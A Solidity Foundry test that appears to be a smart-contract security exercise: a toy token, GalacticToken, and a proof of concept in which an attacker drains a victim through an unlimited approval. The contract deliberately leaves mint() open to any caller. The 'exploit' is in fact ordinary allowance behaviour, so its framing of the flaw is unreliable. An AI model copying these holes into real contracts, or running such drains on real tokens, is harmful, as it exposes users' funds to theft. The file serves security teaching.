// SPDX-License-Identifier: MIT
// Find the vuln, write the exploit POC, and how to mitigate
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    GalacticToken tokenContract;
    address deployer = vm.addr(1);
    address victim = vm.addr(2);
    address attacker = vm.addr(3);

    function setUp() public {
        vm.prank(deployer);
        tokenContract = new GalacticToken();

        // Initial setup
        vm.warp(block.timestamp + 1 hours);
        vm.prank(deployer);
        tokenContract.mint(5000);

        // Give victim some tokens
        vm.prank(deployer);
        tokenContract.transfer(victim, 1000);
    }

    function testExploit() public {
        console.log("Victim initial balance:", tokenContract.balanceOf(victim));
        console.log(
            "Attacker initial balance:",
            tokenContract.balanceOf(attacker)
        );

        // Step 1: Victim approves attacker for a large amount
        vm.prank(victim);
        tokenContract.approve(attacker, type(uint256).max);

        // Step 2: First drain - take initial balance
        vm.prank(attacker);
        tokenContract.transferFrom(victim, attacker, 1000);

        console.log(
            "Victim balance after first drain:",
            tokenContract.balanceOf(victim)
        );
        console.log(
            "Attacker balance after first drain:",
            tokenContract.balanceOf(attacker)
        );

        // Step 3: Victim gets more tokens
        vm.warp(block.timestamp + 1 hours);
        vm.prank(victim);
        tokenContract.mint(2000);

        console.log(
            "Victim balance after mint:",
            tokenContract.balanceOf(victim)
        );

        // Step 4: Attacker drains new tokens without new approval
        vm.prank(attacker);
        tokenContract.transferFrom(victim, attacker, 2000);

        console.log(
            "Victim balance after second drain:",
            tokenContract.balanceOf(victim)
        );
        console.log(
            "Attacker balance after second drain:",
            tokenContract.balanceOf(attacker)
        );

        // Verify exploit success
        assertEq(
            tokenContract.balanceOf(victim),
            0,
            "Victim should have 0 balance"
        );
        assertEq(
            tokenContract.balanceOf(attacker),
            3000,
            "Attacker should have all tokens"
        );

        console.log("Exploit successful - Attacker drained all victim tokens!");
        console.log("Victim final balance:", tokenContract.balanceOf(victim));
        console.log(
            "Attacker final balance:",
            tokenContract.balanceOf(attacker)
        );
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract GalacticToken is IERC20 {
    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "GalacticCredit";
    string public symbol = "GLXC";
    uint8 public decimals = 18;
    uint256 private lastMintTime;
    uint256 private constant MINT_COOLDOWN = 1 hours;

    modifier onlyPositive(uint amount) {
        require(amount > 0, "Amount must be positive");
        _;
    }

    function transfer(address recipient, uint amount) external onlyPositive(amount) returns (bool) {
        require(recipient != address(0), "Invalid recipient");
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        require(spender != address(0), "Invalid spender");
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) external onlyPositive(amount) returns (bool) {
        require(recipient != address(0), "Invalid recipient");
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Insufficient allowance");
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint amount) external {
        require(block.timestamp >= lastMintTime + MINT_COOLDOWN, "Minting in cooldown");
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        lastMintTime = block.timestamp;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint amount) external onlyPositive(amount) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
